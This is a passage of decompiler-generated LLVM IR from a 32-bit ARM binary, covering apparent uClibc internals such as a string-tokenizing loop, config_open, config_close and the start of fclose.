  %v3_17614 = zext i8 %v2_17614 to i32
  store i32 %v3_17614, i32* %r2.global-to-local, align 4
  %v2_17618 = icmp eq i8 %v2_17614, 0
  store i1 %v2_17618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17618, label %dec_label_pc_17484.backedge, label %dec_label_pc_17620

dec_label_pc_17484.backedge:                      ; preds = %dec_label_pc_17614, %dec_label_pc_17620, %dec_label_pc_1772c
  %v0_17484.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17484

dec_label_pc_17620:                               ; preds = %dec_label_pc_17614
  %v0_17620 = load i32, i32* @r7, align 4
  %v1_17620 = inttoptr i32 %v0_17620 to i8*
  %v2_17620 = load i8, i8* %v1_17620, align 1
  %v3_17620 = zext i8 %v2_17620 to i32
  store i32 %v3_17620, i32* %r3.global-to-local, align 4
  %v9_17624 = icmp eq i8 %v2_17620, %v2_17614
  store i1 %v9_17624, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17624, label %dec_label_pc_17484.backedge, label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17620
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v0_17630 = load i32, i32* @r5, align 4
  %v1_17630 = add i32 %v0_17630, 4
  %v2_17630 = inttoptr i32 %v1_17630 to i32*
  %v3_17630 = load i32, i32* %v2_17630, align 4
  store i32 %v3_17630, i32* %r0.global-to-local, align 4
  %v0_17634 = load i32, i32* @fp, align 4
  store i32 %v3_17630, i32* %v1_17650, align 4
  store i32 %v3_17448, i32* %r2.global-to-local, align 4
  %v3_17640 = inttoptr i32 %v3_17630 to i8*
  %v4_17640 = call i32 @__GI_memset(i8* %v3_17640, i32 %v0_17634, i32 %v3_17448)
  store i32 %v4_17640, i32* %r0.global-to-local, align 4
  %v0_17644 = load i32, i32* @fp, align 4
  store i32 %v0_17644, i32* @r6, align 4
  %v0_1770412 = load i32, i32* @r4, align 4
  %v1_1770413 = inttoptr i32 %v0_1770412 to i8*
  %v2_1770414 = load i8, i8* %v1_1770413, align 1
  %v3_1770415 = zext i8 %v2_1770414 to i32
  store i32 %v3_1770415, i32* %r2.global-to-local, align 4
  %v2_1770816 = icmp eq i8 %v2_1770414, 0
  store i1 %v2_1770816, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1770816, label %dec_label_pc_17720, label %dec_label_pc_17710

dec_label_pc_1764c:                               ; preds = %bb72
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_17650 = load i32, i32* %v1_17650, align 4
  store i32 %v2_17650, i32* %r3.global-to-local, align 4
  store i32 %v1_17460, i32* %r2.global-to-local, align 4
  %v9_17658 = icmp eq i32 %v2_1765c, %v1_17460
  store i1 %v9_17658, i1* %cpsr_z.global-to-local, align 1
  %v5_1765c = mul i32 %v2_1765c, 4
  %v6_1765c = add i32 %v2_17650, %v5_1765c
  %v7_1765c = inttoptr i32 %v6_1765c to i32*
  store i32 %v0_1765c, i32* %v7_1765c, align 4
  br i1 %v9_17658, label %dec_label_pc_17664, label %dec_label_pc_17670

dec_label_pc_17664:                               ; preds = %dec_label_pc_1764c
  store i32 %v1_1746c, i32* %r3.global-to-local, align 4
  store i1 %v2_17668, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17668, label %dec_label_pc_17670, label %dec_label_pc_17690

dec_label_pc_17670:                               ; preds = %dec_label_pc_17664, %dec_label_pc_1764c
  %v0_17670 = load i32, i32* @r7, align 4
  %v1_17670 = inttoptr i32 %v0_17670 to i8*
  %v2_17670 = load i8, i8* %v1_17670, align 1
  %v3_17670 = zext i8 %v2_17670 to i32
  store i32 %v3_17670, i32* %r3.global-to-local, align 4
  %v2_17674 = icmp eq i8 %v2_17670, 0
  store i1 %v2_17674, i1* %cpsr_z.global-to-local, align 1
  %v0_17678 = load i32, i32* @r4, align 4
  store i32 %v0_17678, i32* @r0, align 4
  %v1_1767c = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_17674, i32 %v1_1767c, i32 %v0_17670
  store i32 %storemerge, i32* @r1, align 4
  %v0_17684 = call i32 @strcspn()
  store i32 %v0_17684, i32* %r0.global-to-local, align 4
  %v0_17688 = load i32, i32* @r4, align 4
  %v2_17688 = add i32 %v0_17688, %v0_17684
  store i32 %v2_17688, i32* @r4, align 4
  br label %dec_label_pc_176c8

dec_label_pc_17690:                               ; preds = %dec_label_pc_17664
  %v0_17690 = load i32, i32* @r4, align 4
  store i32 %v0_17690, i32* @r0, align 4
  %v0_17694 = load i32, i32* @r7, align 4
  %v1_17694 = inttoptr i32 %v0_17694 to i8*
  %v2_17694 = load i8, i8* %v1_17694, align 1
  %v3_17694 = zext i8 %v2_17694 to i32
  %v5_17698 = call i32 @__GI_strchrnul(i32 %v0_17690, i32 %v3_17694, i32 %v1_17460, i32 %v1_1746c)
  store i32 %v5_17698, i32* %r0.global-to-local, align 4
  store i32 %v1_1745c, i32* %r2.global-to-local, align 4
  store i1 %v2_175f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_17698, i32* @r4, align 4
  br i1 %v2_175f8, label %dec_label_pc_176c8, label %dec_label_pc_176b4

dec_label_pc_176b0:                               ; preds = %dec_label_pc_176b4
  %v1_176b0 = add i32 %v0_176c8.pre, -1
  store i32 %v1_176b0, i32* @r4, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_17690, %dec_label_pc_176b0
  %v0_176b4 = phi i32 [ %v1_176b0, %dec_label_pc_176b0 ], [ %v5_17698, %dec_label_pc_17690 ]
  %v1_176b4 = add i32 %v0_176b4, -1
  %v2_176b4 = inttoptr i32 %v1_176b4 to i8*
  %v3_176b4 = load i8, i8* %v2_176b4, align 1
  %v4_176b4 = zext i8 %v3_176b4 to i32
  %v0_176b8 = load i32, i32* @sl, align 4
  store i32 %v0_176b8, i32* @r0, align 4
  %v2_176bc = call i32 @__GI_strchr(i32 %v0_176b8, i32 %v4_176b4)
  store i32 %v2_176bc, i32* %r0.global-to-local, align 4
  %v2_176c0 = icmp eq i32 %v2_176bc, 0
  store i1 %v2_176c0, i1* %cpsr_z.global-to-local, align 1
  %v0_176c8.pre = load i32, i32* @r4, align 4
  br i1 %v2_176c0, label %dec_label_pc_176c8, label %dec_label_pc_176b0

dec_label_pc_176c8:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_17690, %dec_label_pc_17670
  %v3_176d4 = phi i32 [ %v5_17698, %dec_label_pc_17690 ], [ %v2_17688, %dec_label_pc_17670 ], [ %v0_176c8.pre, %dec_label_pc_176b4 ]
  %v1_176c8 = inttoptr i32 %v3_176d4 to i8*
  %v2_176c8 = load i8, i8* %v1_176c8, align 1
  %v3_176c8 = zext i8 %v2_176c8 to i32
  store i32 %v3_176c8, i32* %r2.global-to-local, align 4
  %v0_176cc = load i32, i32* @r7, align 4
  %v1_176cc = inttoptr i32 %v0_176cc to i8*
  %v2_176cc = load i8, i8* %v1_176cc, align 1
  %v3_176cc = zext i8 %v2_176cc to i32
  store i32 %v3_176cc, i32* %r3.global-to-local, align 4
  %v9_176d0 = icmp eq i8 %v2_176cc, %v2_176c8
  store i1 %v9_176d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_176d0, label %bb69, label %dec_label_pc_176dc

bb69:                                             ; preds = %dec_label_pc_176c8
  %v1_176d4 = load i32, i32* @fp, align 4
  %v2_176d4 = trunc i32 %v1_176d4 to i8
  store i8 %v2_176d4, i8* %v1_176c8, align 1
  %v0_176d8.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_176d8.pr, label %bb71, label %.dec_label_pc_176dc_crit_edge

.dec_label_pc_176dc_crit_edge:                    ; preds = %bb69
  %v0_176dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_176dc

dec_label_pc_176dc:                               ; preds = %.dec_label_pc_176dc_crit_edge, %dec_label_pc_176c8
  %v0_176dc = phi i32 [ %v0_176dc.pre, %.dec_label_pc_176dc_crit_edge ], [ %v3_176c8, %dec_label_pc_176c8 ]
  %v2_176dc = icmp eq i32 %v0_176dc, 0
  store i1 %v2_176dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_176dc, label %bb71, label %bb70

bb70:                                             ; preds = %dec_label_pc_176dc
  %v1_176e0 = load i32, i32* @fp, align 4
  %v2_176e0 = trunc i32 %v1_176e0 to i8
  %v3_176e0 = load i32, i32* @r4, align 4
  %v4_176e0 = inttoptr i32 %v3_176e0 to i8*
  store i8 %v2_176e0, i8* %v4_176e0, align 1
  %v5_176e0 = load i32, i32* @r4, align 4
  %v6_176e0 = add i32 %v5_176e0, 1
  store i32 %v6_176e0, i32* @r4, align 4
  br label %bb71

bb71:                                             ; preds = %bb69, %dec_label_pc_176dc, %bb70
  %v2_176e4 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_176e4, i32* %r3.global-to-local, align 4
  %v2_176e8 = icmp eq i32 %v2_176e4, 0
  store i1 %v2_176e8, i1* %cpsr_z.global-to-local, align 1
  %v0_17704.pre = load i32, i32* @r4, align 4
  br i1 %v2_176e8, label %dec_label_pc_17700, label %dec_label_pc_176f0

dec_label_pc_176f0:                               ; preds = %bb71
  store i32 %v0_17704.pre, i32* @r0, align 4
  %v0_176f4 = load i32, i32* @sl, align 4
  %v2_176f8 = inttoptr i32 %v0_17704.pre to i8*
  %v3_176f8 = call i32 @__GI_strspn(i8* %v2_176f8, i32 %v0_176f4)
  store i32 %v3_176f8, i32* %r0.global-to-local, align 4
  %v0_176fc = load i32, i32* @r4, align 4
  %v2_176fc = add i32 %v0_176fc, %v3_176f8
  store i32 %v2_176fc, i32* @r4, align 4
  br label %dec_label_pc_17700

dec_label_pc_17700:                               ; preds = %bb71, %dec_label_pc_176f0
  %v0_17704 = phi i32 [ %v2_176fc, %dec_label_pc_176f0 ], [ %v0_17704.pre, %bb71 ]
  %v0_17700 = load i32, i32* @r6, align 4
  %v1_17700 = add i32 %v0_17700, 1
  store i32 %v1_17700, i32* @r6, align 4
  %v1_17704 = inttoptr i32 %v0_17704 to i8*
  %v2_17704 = load i8, i8* %v1_17704, align 1
  %v3_17704 = zext i8 %v2_17704 to i32
  store i32 %v3_17704, i32* %r2.global-to-local, align 4
  %v2_17708 = icmp eq i8 %v2_17704, 0
  store i1 %v2_17708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17708, label %dec_label_pc_17720, label %dec_label_pc_17710

dec_label_pc_17710:                               ; preds = %dec_label_pc_1762c, %dec_label_pc_17700
  %v0_1765c = phi i32 [ %v0_17704, %dec_label_pc_17700 ], [ %v0_1770412, %dec_label_pc_1762c ]
  %v2_1765c = phi i32 [ %v1_17700, %dec_label_pc_17700 ], [ %v0_17644, %dec_label_pc_1762c ]
  %v1_17714 = phi i32 [ %v3_17704, %dec_label_pc_17700 ], [ %v3_1770415, %dec_label_pc_1762c ]
  %v0_17710 = load i32, i32* @r7, align 4
  %v1_17710 = inttoptr i32 %v0_17710 to i8*
  %v2_17710 = load i8, i8* %v1_17710, align 1
  %v3_17710 = zext i8 %v2_17710 to i32
  store i32 %v3_17710, i32* %r3.global-to-local, align 4
  %v9_17714 = icmp eq i32 %v3_17710, %v1_17714
  store i1 %v9_17714, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_17714, label %dec_label_pc_17720, label %bb72

bb72:                                             ; preds = %dec_label_pc_17710
  %v2_17718 = load i32, i32* @sb, align 4
  %v3_17718 = sub i32 %v2_1765c, %v2_17718
  %v5_17718 = xor i32 %v2_17718, %v2_1765c
  %v6_17718 = xor i32 %v3_17718, %v2_1765c
  %v7_17718 = and i32 %v6_17718, %v5_17718
  %v8_17718 = icmp slt i32 %v7_17718, 0
  %v9_17718 = icmp slt i32 %v3_17718, 0
  %v10_17718 = icmp eq i32 %v2_1765c, %v2_17718
  store i1 %v10_17718, i1* %cpsr_z.global-to-local, align 1
  %v2_1771c = xor i1 %v9_17718, %v8_17718
  br i1 %v2_1771c, label %dec_label_pc_1764c, label %dec_label_pc_17720

dec_label_pc_17720:                               ; preds = %dec_label_pc_17710, %dec_label_pc_17700, %bb72, %dec_label_pc_1762c
  %v0_17724 = phi i32 [ %v0_17644, %dec_label_pc_1762c ], [ %v2_1765c, %dec_label_pc_17710 ], [ %v1_17700, %dec_label_pc_17700 ], [ %v2_1765c, %bb72 ]
  store i32 %v3_17444, i32* %r2.global-to-local, align 4
  %v9_17724 = icmp eq i32 %v0_17724, %v3_17444
  store i1 %v9_17724, i1* %cpsr_z.global-to-local, align 1
  %v6_17728 = icmp slt i32 %v0_17724, %v3_17444
  br i1 %v6_17728, label %dec_label_pc_1772c, label %dec_label_pc_17738

dec_label_pc_1772c:                               ; preds = %dec_label_pc_17720
  %v0_1772c = load i32, i32* @r8, align 4
  %v1_1772c = and i32 %v0_1772c, 1048576
  %v2_1772c = icmp eq i32 %v1_1772c, 0
  store i1 %v2_1772c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1772c, label %dec_label_pc_17484.backedge, label %dec_label_pc_17734

dec_label_pc_17734:                               ; preds = %dec_label_pc_1772c, %dec_label_pc_175ec, %.thread, %entry
  br label %dec_label_pc_17738

dec_label_pc_17738:                               ; preds = %dec_label_pc_17720, %dec_label_pc_17508, %dec_label_pc_17734
  %v0_17738 = phi i32 [ %v0_17518, %dec_label_pc_17508 ], [ 0, %dec_label_pc_17734 ], [ %v0_17724, %dec_label_pc_17720 ]
  store i32 %v0_17738, i32* %r0.global-to-local, align 4
  store i32 %v3_17420, i32* @r4, align 4
  store i32 %v6_17420, i32* @r5, align 4
  store i32 %v9_17420, i32* @r6, align 4
  store i32 %v12_17420, i32* @r7, align 4
  store i32 %v15_17420, i32* @r8, align 4
  store i32 %v18_17420, i32* @sb, align 4
  store i32 %v21_17420, i32* @sl, align 4
  store i32 %v24_17420, i32* @fp, align 4
  ret i32 %v0_17738

; uselistorder directives
  uselistorder i32 %v0_17738, { 1, 0 }
  uselistorder i32 %v0_17724, { 0, 2, 1 }
  uselistorder i32 %v3_17718, { 1, 0 }
  uselistorder i32 %v2_17718, { 1, 0, 2 }
  uselistorder i32 %v2_1765c, { 0, 1, 7, 2, 3, 6, 5, 4 }
  uselistorder i32 %v0_17704.pre, { 0, 2, 1 }
  uselistorder i32 %v5_17698, { 1, 0, 2, 3 }
  uselistorder i32 %v0_17644, { 1, 0, 2 }
  uselistorder i1 %v9_17624, { 1, 0 }
  uselistorder i32 %v3_175fc, { 0, 2, 1, 3 }
  uselistorder i1 %v7_175ec, { 1, 0 }
  uselistorder i1 %v8_175e4, { 1, 0 }
  uselistorder i32 %v3_175b4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_175a4, { 3, 2, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 %v5_1758c, { 1, 0, 2 }
  uselistorder i32 %v1_1757c, { 1, 2, 0, 3 }
  uselistorder i32 %v0_17568, { 0, 2, 1, 3 }
  uselistorder i32 %v1_17560, { 1, 0 }
  uselistorder i32 %v1_1754c, { 1, 0 }
  uselistorder i32 %v1_17548, { 1, 0 }
  uselistorder i32 %v2_17524, { 1, 0 }
  uselistorder i32 %v1_17508, { 2, 0, 1 }
  uselistorder i32 %v0_174f0, { 1, 0 }
  uselistorder i32 %v1_174e0, { 0, 2, 1 }
  uselistorder i32* %v1_17650, { 1, 0 }
  uselistorder i1 %v2_175f8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1746c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_17460, { 2, 1, 0 }
  uselistorder i32 %v3_17448, { 1, 2, 0 }
  uselistorder i32 %v3_17444, { 2, 1, 0 }
  uselistorder i32 %v1_1743c, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 7, 2, 3, 4, 5, 6, 18, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 11, 12, 10, 9, 14, 13, 16, 15, 17, 18, 21, 19, 20, 25, 22, 23, 24, 27, 26, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 11, 12, 13, 2, 3, 4, 5, 6, 7, 8, 9, 10, 32, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 1048576, { 2, 1, 3, 0 }
  uselistorder i32 (i8*)* @strlen, { 1, 0 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_17738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17720, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17710, { 1, 0 }
  uselistorder label %dec_label_pc_17700, { 1, 0 }
  uselistorder label %bb71, { 2, 1, 0 }
  uselistorder label %dec_label_pc_176b4, { 1, 0 }
  uselistorder label %dec_label_pc_17484.backedge, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17614, { 1, 0 }
  uselistorder label %dec_label_pc_175ec, { 1, 0 }
  uselistorder label %dec_label_pc_175e0, { 0, 2, 1 }
  uselistorder label %dec_label_pc_175a4, { 1, 0 }
  uselistorder label %dec_label_pc_174d8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
}

define i32 @__GI_config_close(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_1774c = icmp eq i32* %arg1, null
  br i1 %v2_1774c, label %dec_label_pc_17774, label %dec_label_pc_17754

dec_label_pc_17754:                               ; preds = %entry
  %v2_17754 = load i32, i32* %arg1, align 4
  %v1_17758 = inttoptr i32 %v2_17754 to i16*
  %v2_17758 = call i32 @__GI_fclose(i16* %v1_17758)
  %v0_1775c = load i32, i32* @r4, align 4
  %v1_1775c = add i32 %v0_1775c, 20
  %v2_1775c = inttoptr i32 %v1_1775c to i32*
  %v3_1775c = load i32, i32* %v2_1775c, align 4
  %v2_17760 = icmp eq i32 %v3_1775c, 0
  br i1 %v2_17760, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_17754
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_17754, %bb
  store i32 96108, i32* @lr, align 4
  %v1_17768 = xor i1 %v2_17760, true
  call void @__pseudo_cond_branch(i1 %v1_17768, i32 ptrtoint (i32* @global_var_1504c.63 to i32))
  %v0_1776c = load i32, i32* @r4, align 4
  store i32 %v0_1776c, i32* @r0, align 4
  %v0_17770 = call i32 @free()
  br label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %entry, %bb6
  %v1_17778 = phi i32 [ 0, %entry ], [ %v0_17770, %bb6 ]
  ret i32 %v1_17778

; uselistorder directives
  uselistorder label %dec_label_pc_17774, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @__GI_config_open(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17788 = load i32, i32* @r4, align 4
  store i32 %v3_17788, i32* %stack_var_-8, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24424.765 to i32), i32 -33972), i32* @r1, align 4
  %v0_17790 = call i32 @__GI_fopen()
  store i32 %v0_17790, i32* %r0.global-to-local, align 4
  store i32 %v0_17790, i32* @r4, align 4
  %v2_17794 = icmp eq i32 %v0_17790, 0
  br i1 %v2_17794, label %bb, label %dec_label_pc_177a0

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_177a0:                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_177a8 = call i32 @calloc(i32 1, i32 24)
  store i32 %v2_177a8, i32* %r0.global-to-local, align 4
  %v2_177ac = icmp eq i32 %v2_177a8, 0
  br i1 %v2_177ac, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_177a0
  %v1_177b0 = load i32, i32* @r4, align 4
  %v3_177b0 = inttoptr i32 %v2_177a8 to i32*
  store i32 %v1_177b0, i32* %v3_177b0, align 4
  %v1_177b8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_177a0, %bb4
  %v1_177b8 = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_177a0 ], [ %v1_177b8.pre, %bb4 ]
  %v2_177b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_177b4, i32* @r4, align 4
  ret i32 %v1_177b8

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32 (i32, i32)* @calloc, { 36, 34, 35, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @__GI_fclose(i16* %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_177c4 = load i32, i32* @r4, align 4
  store i32 %v3_177c4, i32* %stack_var_-36, align 4
  %v6_177c4 = load i32, i32* @r5, align 4
  %v9_177c4 = load i32, i32* @r6, align 4
  %v12_177c4 = load i32, i32* @r7, align 4
  %v2_177c8 = add i32 %tmp, 52
  %v3_177c8 = inttoptr i32 %v2_177c8 to i32*
  %v4_177c8 = load i32, i32* %v3_177c8, align 4
  store i32 %v4_177c8, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_177d0 = icmp eq i32 %v4_177c8, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_24424.765 to i32), i32* @r8, align 4
  br i1 %v2_177d0, label %dec_label_pc_177e4, label %dec_label_pc_17848

dec_label_pc_177e4:                               ; preds = %entry
  %v0_177e4 = call i32 @__aeabi_read_tp()
  store i32 %v0_177e4, i32* %r0.global-to-local, align 4
  %v0_177e8 = load i32, i32* @r5, align 4
  %v1_177e8 = add i32 %v0_177e8, 64
  %v2_177e8 = inttoptr i32 %v1_177e8 to i32*
  %v3_177e8 = load i32, i32* %v2_177e8, align 4
  store i32 %v3_177e8, i32* %r3.global-to-local, align 4
  %v1_177ec = add i32 %v0_177e4, -1168
  store i32 %v1_177ec, i32* @r6, align 4
  %v3_177f0 = icmp uge i32 %v3_177e8, %v1_177ec
  store i1 %v3_177f0, i1* %cpsr_c.global-to-local, align 1
  %v9_177f0 = icmp eq i32 %v3_177e8, %v1_177ec
  br i1 %v9_177f0, label %dec_label_pc_1783c, label %dec_label_pc_177f8

dec_label_pc_177f8:                               ; preds = %dec_label_pc_177e4
  %v1_177f8 = add i32 %v0_177e8, 56
  store i32 %v1_177f8, i32* @r7, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v1_177f8, i32* %r2.global-to-local, align 4
  %v0_17804 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_17804, i32* @r4, align 4
  %v1_17808115 = inttoptr i32 %v1_177f8 to i32*
  %v2_17808116 = load i32, i32* %v1_17808115, align 4
  store i32 %v2_17808116, i32* %r3.global-to-local, align 4
  %v3_1780c118 = icmp uge i32 %v2_17808116, %v0_17804
  store i1 %v3_1780c118, i1* %cpsr_c.global-to-local, align 1
  %v9_1780c124 = icmp eq i32 %v2_17808116, %v0_17804
  br i1 %v9_1780c124, label %dec_label_pc_17814, label %dec_label_pc_1782c

dec_label_pc_17814:                               ; preds = %dec_label_pc_177f8, %dec_label_pc_17814.dec_label_pc_17808_crit_edge
  %v0_17814125 = phi i32 [ %v1_1780c.pre, %dec_label_pc_17814.dec_label_pc_17808_crit_edge ], [ %v0_17804, %dec_label_pc_177f8 ]
  store i32 %v0_17814125, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17824 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17824, label %dec_label_pc_17828, label %dec_label_pc_17814.dec_label_pc_17808_crit_edge

dec_label_pc_17814.dec_label_pc_17808_crit_edge:  ; preds = %dec_label_pc_17814
  %v0_17808.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1780c.pre = load i32, i32* @r4, align 4
  %v1_17808 = inttoptr i32 %v0_17808.pre to i32*
  %v2_17808 = load i32, i32* %v1_17808, align 4
  store i32 %v2_17808, i32* %r3.global-to-local, align 4
  %v3_1780c = icmp uge i32 %v2_17808, %v1_1780c.pre
  store i1 %v3_1780c, i1* %cpsr_c.global-to-local, align 1
  %v9_1780c = icmp eq i32 %v2_17808, %v1_1780c.pre
  br i1 %v9_1780c, label %dec_label_pc_17814, label %dec_label_pc_1782c

dec_label_pc_17828:                               ; preds = %dec_label_pc_17814
  %v0_17828 = load i32, i32* @r4, align 4
  store i32 %v0_17828, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1782c

dec_label_pc_1782c:                               ; preds = %dec_label_pc_177f8, %dec_label_pc_17814.dec_label_pc_17808_crit_edge, %dec_label_pc_17828
  %v0_1782c = phi i32 [ %v0_17828, %dec_label_pc_17828 ], [ %v2_17808116, %dec_label_pc_177f8 ], [ %v2_17808, %dec_label_pc_17814.dec_label_pc_17808_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1782c = icmp eq i32 %v0_1782c, 0
  br i1 %v2_1782c, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_1782c
  %v1_17830 = load i32, i32* @r7, align 4
  store i32 %v1_17830, i32* %r0.global-to-local, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_1782c, %bb
  %v1_17834 = xor i1 %v2_1782c, true
  call void @__pseudo_cond_branch(i1 %v1_17834, i32 ptrtoint (i32* @global_var_15ff0.919 to i32))
  %v0_17838 = load i32, i32* @r6, align 4
  %v1_17838 = load i32, i32* @r5, align 4
  %v2_17838 = add i32 %v1_17838, 64
  %v3_17838 = inttoptr i32 %v2_17838 to i32*
  store i32 %v0_17838, i32* %v3_17838, align 4
  %v0_1783c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1783c

dec_label_pc_1783c:                               ; preds = %dec_label_pc_177e4, %bb41
  %v0_1783c = phi i32 [ %v0_177e8, %dec_label_pc_177e4 ], [ %v0_1783c.pre, %bb41 ]
  %v1_1783c = add i32 %v0_1783c, 60
  %v2_1783c = inttoptr i32 %v1_1783c to i32*
  %v3_1783c = load i32, i32* %v2_1783c, align 4
  %v1_17840 = add i32 %v3_1783c, 1
  store i32 %v1_17840, i32* %r3.global-to-local, align 4
  store i32 %v1_17840, i32* %v2_1783c, align 4
  %v0_17848.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17848

dec_label_pc_17848:                               ; preds = %entry, %dec_label_pc_1783c
  %v1_17850 = phi i32 [ %tmp, %entry ], [ %v0_17848.pre, %dec_label_pc_1783c ]
  %v1_17848 = inttoptr i32 %v1_17850 to i16*
  %v2_17848 = load i16, i16* %v1_17848, align 2
  %v3_17848 = zext i16 %v2_17848 to i32
  store i32 %v3_17848, i32* %r3.global-to-local, align 4
  %v1_1784c = and i32 %v3_17848, 64
  %v2_1784c = icmp eq i32 %v1_1784c, 0
  br i1 %v2_1784c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_17848
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_17848, %bb42
  %storemerge = phi i32 [ %v1_17850, %bb42 ], [ %v1_1784c, %dec_label_pc_17848 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 96344, i32* @lr, align 4
  %v1_17854 = xor i1 %v2_1784c, true
  call void @__pseudo_cond_branch(i1 %v1_17854, i32 ptrtoint (i32* @global_var_18698.1011 to i32))
  %v0_17858 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17858, i32* %fp.global-to-local, align 4
  %v0_1785c = load i32, i32* @r5, align 4
  %v1_1785c = add i32 %v0_1785c, 4
  %v2_1785c = inttoptr i32 %v1_1785c to i32*
  %v3_1785c = load i32, i32* %v2_1785c, align 4
  store i32 %v3_1785c, i32* %r0.global-to-local, align 4
  %v1_17860 = call i32 @__GI___libc_close(i32 %v3_1785c)
  store i32 %v1_17860, i32* %r0.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_17868 = load i32, i32* @r8, align 4
  %v2_17868 = add i32 %v0_17868, 160
  %v3_17868 = inttoptr i32 %v2_17868 to i32*
  %v4_17868 = load i32, i32* %v3_17868, align 4
  store i32 %v4_17868, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1786c = icmp slt i32 %v1_17860, 0
  br i1 %v1_1786c, label %bb44, label %bb45

bb44:                                             ; preds = %bb43
  store i32 -1, i32* %fp.global-to-local, align 4
  br label %bb45

bb45:                                             ; preds = %bb43, %bb44
  %v1_17874 = add i32 %v4_17868, 8
  %v2_17874 = inttoptr i32 %v1_17874 to i32*
